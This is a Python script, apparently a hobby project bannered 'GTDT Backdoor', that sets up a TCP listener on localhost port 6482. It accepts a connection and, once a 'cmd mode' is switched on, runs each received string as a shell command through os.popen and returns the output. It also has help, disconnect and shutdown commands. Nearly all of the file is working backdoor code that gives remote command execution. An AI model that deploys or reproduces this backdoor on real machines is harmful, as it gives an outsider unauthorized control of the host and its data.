"""
                ╔═══════════════════════════════════════════════════╗
                ║───────────────────────────────────────────────────║
                ║────────────────╔═══╦════╦═══╦════╗────────────────║
                ║────────────────║╔═╗║╔╗╔╗╠╗╔╗║╔╗╔╗║────────────────║
                ║────────────────║║─╚╩╝║║╚╝║║║╠╝║║╚╝────────────────║
                ║────────────────║║╔═╗─║║──║║║║─║║──────────────────║
                ║────────────────║╚╩═║─║║─╔╝╚╝║─║║──────────────────║
                ║────────────────╚═══╝─╚╝─╚═══╝─╚╝──────────────────║
                ║────────────╔══╗──────╔╗─╔═══╗─────────────────────║
                ║────────────║╔╗║──────║║─╚╗╔╗║─────────────────────║
                ║────────────║╚╝╚╦══╦══╣║╔╗║║║╠══╦══╦═╗─────────────║
                ║────────────║╔═╗║╔╗║╔═╣╚╝╝║║║║╔╗║╔╗║╔╝─────────────║
                ║────────────║╚═╝║╔╗║╚═╣╔╗╦╝╚╝║╚╝║╚╝║║──────────────║
                ║────────────╚═══╩╝╚╩══╩╝╚╩═══╩══╩══╩╝──────────────║
                ║───────────────────────────────────────────────────║
                ╚═══════════════════════════════════════════════════╝
"""



## Importing needed modules.
from time import sleep
import socket, os

## Help command text.
HelpCommand = """\n\n
        *Available commands:
        Help               |   For help.
        ServerShutdown     |   For exiting the server script.
        Disconnect         |   For disconnecting from the server.
        Cmdon              |   For turning cmd mode on.
        CmdOff             |   For turning cmd mode off.
        Cls                |   For clearing terminal.
"""

## Definition/Function that starts the server.
def ServerStart():
	global server, controller

	#IP   Port =     IP       Port
	Host, Port = 'localhost', 6482

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((Host, Port))

## Definition/Function that starts the listening process and accepts connections.
def ListenAndAcceptConnection():
	global controller
	server.listen()
	controller, address = server.accept()
	controller.send(f"\n\n  Server: You just connected to the server!{HelpCommand}".encode('utf-8'))

## Definition/Function with all the Functionality of the backdoor.
def Functionality():

	## Cmd Mode is disabled by default.
	CmdMode = False

	while True:

		## Server Command Receiver.
		SCR = controller.recv(2048).decode('utf-8')


		## Command to turn cmd mode on.
		if SCR == "CmdOn" or SCR == "Cmdon" or SCR == "cmdon":
			CmdMode = True
			controller.send("\n\n  Server: !! Cmd Mode Is On !!".encode('utf-8'))
			continue

		## Command to turn cmd mode off.
		elif SCR == "CmdOff" or SCR == "Cmdoff" or SCR == "cmdoff":
			CmdMode = False
			controller.send("\n\n  Server: !! Cmd Mode Is Off !!".encode('utf-8'))

		## Command to disconnect the user.
		elif SCR == "Disconnect" or SCR == "disconnect":
			controller.send("\n\n  Server: You just disconnected!".encode('utf-8'))
			ReStart()

		## ServerShutdown command.
		elif SCR == "ServerShutdown" or SCR == "Servershutdown" or SCR == "servershutdown":
			controller.send("\n\n  Server: Confirm By Typing: Server_Shutdown_Confirm".encode('utf-8'))
		
		## For CMD execution for windows.
		elif CmdMode:
			CMD = os.popen(SCR)
			CmdOutput = CMD.read()
			controller.send(CmdOutput.encode('utf-8'))

		## Help Command.
		elif SCR == "HELP" or SCR == "Help" or SCR == "help":
			controller.send(HelpCommand.encode('utf-8'))

		## Command to disconnect the user.
		elif SCR == "Cls" or SCR == "cls":
			sleep(0.5)
			controller.send("\n\n  Server: Console is cleared.".encode('utf-8'))

		## ServerShutdown confirmation that shuts down the server & user script.
		elif SCR == "Server_Shutdown_Confirm":
			controller.send("\n\n  Server: You closed server script!\n\n".encode('utf-8'))
			controller.close()
			os._exit(2)

		## Else send user that command is unknown.
		else:
			#controller.send("\n\n  Server: !!Unknown command!!".encode('utf-8'))
			controller.send(f"\n\n  Invalid command: {SCR}".encode('utf-8'))
			print(f"\n\n  Invalid command: {SCR}")

## Definition/Function for starting the server.
def Start():
	ServerStart()
	ListenAndAcceptConnection()
	Functionality()

## Definition/Function for restarting the server.
def ReStart():
	controller.close()
	ListenAndAcceptConnection()
	Functionality()

## Executing Start Definition/Function to the server.
Start()



